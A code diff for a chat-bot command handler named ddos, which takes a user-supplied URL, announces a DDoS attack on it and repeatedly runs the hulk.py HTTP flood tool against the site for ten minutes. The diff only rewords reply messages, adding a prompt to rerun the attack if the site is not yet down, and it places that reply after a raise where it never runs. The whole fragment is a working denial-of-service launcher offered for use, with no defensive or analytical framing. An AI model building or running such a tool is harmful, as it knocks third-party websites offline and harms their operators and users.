@@ -14,7 +14,7 @@ async def ddos(event):
      return
   url = event.pattern_match.group(1)
   cmnd = f"{url}"
-  await event.reply(f"Starting DDOS attack on site `{url}`\n\nThis attack will automatically stop after 10 mins if the site doesn't go down execute the command again")
+  await event.reply(f"Starting DDOS attack on site `{url}`\n\nThis attack will automatically stop after 10 mins")
   print("starting attack")
   timeout = 600
   timeout_start = time.time()
@@ -22,3 +22,4 @@ async def ddos(event):
      subprocess.run(["python", "hulk.py", cmnd, "safe"])
   if time.time() >= timeout_start + timeout:
      raise KeyboardInterrupt
+     await event.reply(f"Attacked has stopped now\nIf {url} still isn't down then run the same command again")
